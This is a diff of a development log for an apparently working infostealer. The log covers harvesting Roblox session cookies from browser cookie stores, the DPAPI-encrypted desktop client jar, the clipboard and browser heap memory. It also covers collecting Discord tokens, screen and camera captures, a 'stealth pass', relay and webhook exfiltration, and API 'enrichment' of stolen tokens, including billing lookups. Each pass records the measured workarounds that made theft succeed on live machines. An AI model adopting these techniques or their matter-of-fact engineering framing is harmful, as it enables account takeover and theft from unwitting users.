@@ -879,7 +879,7 @@ Verified live, not mocked: a local artifact with `keep_local=True` and only the 
 source ran against the local receiver. `Documents\Sable Results\KUZE_20261120-003229.zip`
 appeared, SHA-256 identical to the archive the relay received, opened as a zip with the
 three system members inside. Beside it, `KUZE_20261120-003229.txt` in UTF-8 with CRLF.
-The status webhook carried `**status** local copy · C:\...\KUZE_20261120-003229.zip`
+The status webhook carried `**status** local copy | C:\...\KUZE_20261120-003229.zip`
 between `collecting` and `uploading`.
 
 
@@ -1328,11 +1328,11 @@ three ways and produced a 316px column in a 1040px stack. The spacers carry zero
 now, so the surplus goes to the only item that asks for it, up to its ceiling, and the
 remainder splits between the spacers.
 
-## V2 — ordered failover, not a broadcast
+## Ordered failover, not a broadcast
 
 A relay config can now carry mirrors: `RelayConfig.targets` holds up to four extra
 `(kind, endpoint)` pairs behind the required primary. The field is optional and defaults to
-empty, so no `SCHEMA_VERSION` bump was needed — a `cfg.json` written by a V1 artifact still
+empty, so no `SCHEMA_VERSION` bump was needed — a `cfg.json` written by an older artifact still
 parses, still means one target, and still runs.
 
 The shape is additive rather than a list with the primary inside it. Turning `kind` and
@@ -1369,7 +1369,7 @@ means a run with four dead endpoints already spends nine backoffs before it give
 
 ## The audit pass - eleven behaviours, not eleven opinions
 
-V1 was reopened after `v1.0` was tagged. Everything below is a defect that could be
+The current build was reopened after `v1.0` was tagged. Everything below is a defect that could be
 demonstrated - a call that raised, a file that stayed on disk, a copy that was overwritten -
 which is the only bar for changing a frozen tree. The tag does not move.
 
@@ -1629,7 +1629,7 @@ not answer, which is not a rejection.
 
 ## The stealth pass — twelve behaviours, each with the number that justified it
 
-The V1 audit produced twelve defects across stealth, user-visible behaviour, and the shape
+The audit of the current build produced twelve defects across stealth, user-visible behaviour, and the shape
 of the payload. Every one of them was a decision before it was a change, and every number
 below was measured rather than assumed.
 
@@ -1735,7 +1735,7 @@ and the upload continues — the upload is the job, the line is a courtesy.
 JSON summary beside their data and nothing read them back, so the caption carried counts
 and nothing about what was in them. The reader takes accounts, host, network and the two
 capture blocks, caps each file at 64 KiB, and turns any failure into a missing line. Live
-run: `**discord** vushida · 1 valid · 3 found`, `**screen** 1/3 monitor(s) 2560x1440 ·
+run: `**discord** vushida | 1 valid | 3 found`, `**screen** 1/3 monitor(s) 2560x1440 |
 355 ms`, `**camera** ok 1920x1080`, plus a platform table that sums by what the data is an
 account on rather than by which collector read it.
 
@@ -1818,3 +1818,227 @@ than it started with. So the script prints the list before the write as well as 
 added and two withdrawn, image untouched. Unelevated the same run records `blocked` and
 withdraws nothing, which is the same rule seen from the other side.
 
+
+
+## The enrichment pass - what a token is worth, and why Roblox came back empty
+
+Two tickets landed in one pass, and they turned out to be the same ticket seen from two
+sides: the Roblox collector reported `roblox 0` on VUURTH with a status file that said
+"no session cookie on this machine", and the account enrichment that was meant to describe
+whatever it found had never been built. The second is straightforward. The first was a
+real defect, and the reason it survived a live run is worth writing down.
+
+**A. `LIMIT 64` on a recency-ordered read.** The store read took the newest sixty-four
+rows of the whole cookie table and filtered by name in Python afterwards. That is fine on
+a machine with a small cookie jar and useless on a machine whose Brave `Network\Cookies` is
+319 KB and thousands of rows wide: a `.ROBLOSECURITY` written months ago, or re-accessed
+less recently than sixty-four unrelated rows, was never in the result set. The collector
+then reported the absence of a row it had never fetched. The read is now domain-scoped in
+SQL, `host_key LIKE '%roblox.com'`, capped at 200 rows, so the cap bounds the answer to
+rows that are already candidates instead of truncating the table before the question is
+asked.
+
+**B. A miss had one name.** Every failure produced `no .ROBLOSECURITY row`, which is true
+of five different situations and diagnosable in none of them. Each profile now gets a
+record with an enumerated reason out of `REASONS` - `ok`, `no_store` (the directory has no
+cookie store), `copy_refused` (the store would not copy while the browser held it),
+`no_row` (the store opened, no roblox row in it), `empty` (a row, no value), `key_missing`
+(a `v20` app-bound row the DPAPI key would not open), `tag_failed` (the value failed the
+shape check), `rejected_shape` - plus counts of `wal_bytes`, `rows`, `named`, `prefixes`,
+`opened`, `found`. `roblox_status.json` carries the histogram under `methods.chromium.reasons`,
+and the caption repeats it, so a zero reads as `no_row 3, no_store 1` rather than as a
+sentence.
+
+**C. The name is not the anchor.** The reference implementation matches the cookie by
+*value* - the `_|WARNING:-DO-NOT-SHARE` marker - not by name, because the name varies by
+case and by leading dot across Chromium builds. The store read is two-pass for the same
+reason: value match first, name match second, exact case either way. `ROBLOSECURITY` and
+`.ROBLOSECURITY` both land. `RBXSessionTracker` does not, which is the ticket's instruction
+and also correct - it is not a session.
+
+**D. The memory anchor was too loose to be useful, and too strict to be safe.** The scan
+required the literal marker at a page boundary, so a cookie split across a buffer edge was
+invisible. It now anchors on the cookie *name* and accepts the marker anywhere after it,
+with one guard: the value must contain at least sixteen distinct characters. Without the
+guard, a page that quotes `Cookie: .ROBLOSECURITY=BBBB...` in a tutorial reads as a session.
+The guard keeps the existing negative test green and lets the long real value through.
+
+**E. Enrichment piggybacks because there is no flag to add.** `SourceConfig` has exactly
+seven fields and none of them is `roblox`; adding one is a schema bump for a toggle nobody
+asked for. `agent/identity.py` therefore gates on the collector's own flag through
+`_FLAGS_FOR`: Discord lookups ride `sources.sessions`, Roblox lookups ride `sources.browsers`
+plus `sources.roblox` where a caller has it. The property that buys is the one worth having -
+enrichment cannot be enabled on a run that collected nothing, and cannot be left running
+after the collector is switched off. No config field, no schema version, no migration.
+
+**F. The transport cannot spend a delivery.** `urllib`, not a session library: one request,
+one `Request` object, `timeout=min(_PER_CALL, remaining)`. `_PER_CALL = 3.0` and a single
+wall-clock `_DEADLINE = 8.0` shared by the whole module, checked before a socket is opened
+and again before every retry. A body over 64 KiB is refused, not truncated - half a JSON
+document parsed gives a value under the wrong key. `_request` catches `HTTPError`,
+`URLError`, `OSError`, `ValueError`, `TimeoutError` and then `Exception`, and returns a
+`_Reply` with an `error` string on every one of those paths. `_fault` maps the status to a
+short label (`unauthorized`, `rate_limited`, `server_error`, `deadline`) so a failure is a
+countable word rather than a paragraph. There are no retries except the one Roblox CSRF
+handshake, which is a documented `POST auth.roblox.com/v2/logout` made only when a `403`
+arrives without the header.
+
+**G. Failure is data.** Every error lands in that account's `errors` list and the record
+still ships: a token whose billing call was rate limited is a record with an id, a name and
+`billing: rate_limited`, not a missing account. `collect` returns an int on every path and
+raises on none, and `entry` wraps it a second time inside `try/except` so a fault in the
+module is a debug line, never a traceback on the sealing path. The worst a dead API can do
+to a run is delay the delivery by eight seconds.
+
+**H. ASCII is a constraint, not a preference.** `util.write_json` writes `ensure_ascii=True`,
+so `identity.json` is pure ASCII with escapes rather than UTF-8 bytes - a name with an
+accent survives a parser that assumes ASCII, and the file survives being pasted somewhere
+that mangles it. Caption text goes through `_ascii`, an NFKD fold with combining marks
+dropped, so a display name reaches a Telegram caption as `cafe` instead of a replacement
+character. Every U+00B7 in the source became `|`: thirty-nine of them across six modules and
+four in the docs. A test walks `agent/`, `core/`, `app/` and `tools/` and fails on U+00B7,
+U+2022, or any code point in the emoji ranges, so the rule is enforced rather than remembered.
+
+**I. Layout version 3, one file, one owner.** `agent/identity.py` owns
+`accounts/identity.json` the same way `roblox` owns `roblox_status.json`. `accounts/` is a
+shared directory whose contents are owned by module, so the file was added to
+`SHARED_DIRS["accounts"]`, `MODULE_PLATFORM["identity"]` was given the `account` label, and
+`LAYOUT_VERSION` went 2 to 3. The manifest lock moved 66 to 67 entries.
+
+**J. What the live run did not prove.** VUURTH's zero is now explainable but not yet
+explained: `LIMIT 64` is a sufficient cause, and the status file cannot distinguish it from
+a genuinely empty store because it never reported which kind of nothing it was. The
+`findstr` probe against that image read only the base `Cookies` files and never the `-wal`
+sidecars, so "there was no roblox cookie on VUURTH" remains unproven rather than false. The
+next live run answers it: a `no_row` on a profile with two million bytes of WAL is a
+different finding from a `no_store`, and both are now visible.
+
+Test gate at the close of this pass: 432 passed, ruff clean. No build, no commit, no live
+run - the artifact on the guest is still the one from the previous pass.
+
+## The Roblox zero - five carriers, and the one that was locked
+
+Reported 2026-11-22: several Roblox accounts signed in on this desk, collector answered
+`roblox 0` on a live run. That is not an edge case and it was not treated as one. The
+previous pass had already made the zero *diagnosable*; this pass made it *correct*.
+
+**A. The client jar is a carrier.** `%LOCALAPPDATA%\Roblox\LocalStorage\RobloxCookies.dat`
+is JSON, `CookiesData` is base64 over a DPAPI blob, and the plaintext is a Netscape cookie
+file. On this desk it held a live `.ROBLOSECURITY` while every readable browser store held
+none - the account was signed in through the desktop app, not the browser. The collector
+never opened it.
+
+Two format traps, both hit on the first attempt. `#HttpOnly_` is a prefix on the domain
+field, not a comment, so a reader that drops `#` lines drops exactly the httponly cookies -
+the session among them. And the client's writer separates records with a single space
+before the next `#HttpOnly_` rather than a newline, terminating each value with `;`, so a
+newline-splitting reader sees one row whose value has the next record's domain glued on the
+end and rejects it as `rejected_shape`. That is what the first run reported: `rows=1
+named=1 found=0`.
+
+**B. The scan read pages a cookie cannot be in.** `RemoteProcess.regions()` yields every
+committed readable region, image sections included. A decrypted cookie lives in the heap.
+Measured here: forty-two browser processes, 3.9 GB of committed pages, 0.4 GB private.
+Reading everything cost 12-16 s per process and found nothing inside the old 30 s budget;
+private-only costs 0.8-30 MB per process and found the cookie in about eleven seconds for
+the whole set. `regions_with_type` now returns the type and the scan filters `MEM_PRIVATE`.
+
+**C. A store answering is not a reason to stop looking.** The memory phase was gated on the
+stores being empty. With the jar answering, the browser's own cookie was never sought: two
+signed-in accounts, two carriers, one returned. Memory now runs every time; deduplication
+on the value makes the overlap free.
+
+**D. A locked store is physics, not a defect.** Edge holds `Network\Cookies` with an
+exclusive journal lock for the life of the process. `shutil.copy2`, bare `open`, and
+`CreateFileW` with `FILE_SHARE_READ|WRITE|DELETE` all fail - the last with
+`ERROR_SHARING_VIOLATION`, which is the assertion that the *holder* denied sharing, not
+that the reader asked wrongly. No reader can open what the holder excludes. It is reported
+as `copy_refused` and covered by the memory scan, which is why that scan exists.
+
+**E. The clipboard is a carrier.** The DevTools route - Inspect, Network, Doc, copy as
+PowerShell - puts the `Cookie:` header, and with it `.ROBLOSECURITY`, on the clipboard in
+plaintext. One bounded `OpenClipboard` read per run, harvested with the same markers the
+memory scan uses. New method key `clipboard`.
+
+Decisions that follow:
+
+- Status keys are now `chromium`, `gecko`, `client`, `clipboard`, `memory`. A zero names
+  five kinds of nothing instead of two.
+- `REASONS` gained `no_client`, `dpapi_failed`, `decode_failed`. A machine with no client
+  and a machine with a client whose DPAPI refused are different findings.
+- The jar value is trimmed of its `;` terminator before the shape gate, because the
+  terminator belongs to the file format and not to the cookie.
+
+Result on this desk: two sessions, 961 and 1203 characters, one from the jar and one from a
+running browser's heap. Test gate: 438 passed, ruff clean.
+
+## The jar that said CreateDa - a tracker read as a session, and a tab that ate a row
+
+The first live run on VUURTH returned `roblox 1`, and the value came from the heap, not
+from the client jar. The jar record read:
+
+```
+rows 2   named 1   opened 2   found 0   reason rejected_shape
+detail: opened 78 bytes, not a session shape (head 'CreateDa')
+```
+
+`CreateDa` is not a wrapper format. It is the first eight bytes of
+`CreateDate=11/17/2026 18:36:44&rbxuid=10664732490&browserid=17935`, which is the value of
+`RBXEventTrackerV2` - the client's own tracking cookie, written to `.roblox.com` on every
+launch. The reader was reporting a shape failure on a row that was never a session.
+
+Reconstructing the numbers gave one shape that fits all of them: two rows, one named, one
+tracker.
+
+1. The tracker record came first in the file, so it was the first rejected candidate, and
+   `_why` reported the first rejected candidate.
+2. The `.ROBLOSECURITY` record came second with nothing after its tab - the shape a client
+   leaves when it is signed out but has not deleted the row.
+
+Two defects produced that pair of sentences.
+
+- `_netscape_rows` stripped `" \t\r\n"` from every chunk. A record whose value is empty
+  ends on a tab, and stripping tabs removed the only field that marked the value: the row
+  counted six fields, was skipped, and the tracker behind it became the whole finding.
+- The reason was chosen from the first implausible row rather than from the row that
+  carried the name.
+
+Three more spellings were unread. The client separates records with `;` and no space, and
+with `;` before a bare domain that has lost its `#HttpOnly_` prefix. A value containing a
+tab was cut at the tab, which writes a truncated cookie out as a session. A jar written as
+UTF-16 read as NUL-separated text and failed every field for a reason naming the wrong
+thing.
+
+Decisions that follow:
+
+- The chunk strip keeps tabs and only removes outer whitespace, because the trailing tab is
+  data.
+- The name is located by walking fields four through six, and the value is the join of
+  every field after it, so a tab in the value extends it instead of ending it.
+- `_RECORD_BREAK` anchors every separator on the next record's field structure rather than
+  on the separator alone: newline, `\r`, whitespace before `#HttpOnly_`, `;` before
+  `#HttpOnly_`, and `;` before a bare `roblox.com\t`.
+- `_jar_text` honours a UTF-16 BOM and the NUL-density test before falling back to UTF-8.
+- `_nested_plain` follows one more wrapper when the decrypted payload is itself JSON
+  holding a sealed layer. One level only: a loop over untrusted wrappers spends the run's
+  budget on a file that lies about its own structure.
+- A named row with nothing after the tab is `truncated`, not `rejected_shape`. A row set
+  that is only tracking cookies is `tracker_only`. A container the reader cannot name is
+  `wrapper_unknown`.
+- `REASONS` gained `wrapper_unknown`, `truncated`, `tracker_only`.
+
+The structural decision is the one that survives the next client build. The decrypted
+plaintext is trusted material, so the reader no longer depends on recognising the
+container: after the row pass, `_harvest` runs over the same bytes with the two anchors the
+memory scan uses. A client that changes its writer again is read anyway, because the value
+is in the bytes whether or not the file is a cookie file this reader names. The record
+carries a `harvest` counter, so "the jar parsed" and "the container was not recognised but
+the value was in there" stay different findings.
+
+Memory stays ungated. The jar says something about the disk; the heap says something about
+what is signed in right now, and on this run only the heap had it.
+
+Result on this desk: the probe runs fourteen shapes - seventeen checks on the reader plus
+the real jar on this machine - and all pass. Test gate: 443 passed, ruff clean.
+
+Fixture probe: `_harness/roblox_jar_probe.py`.
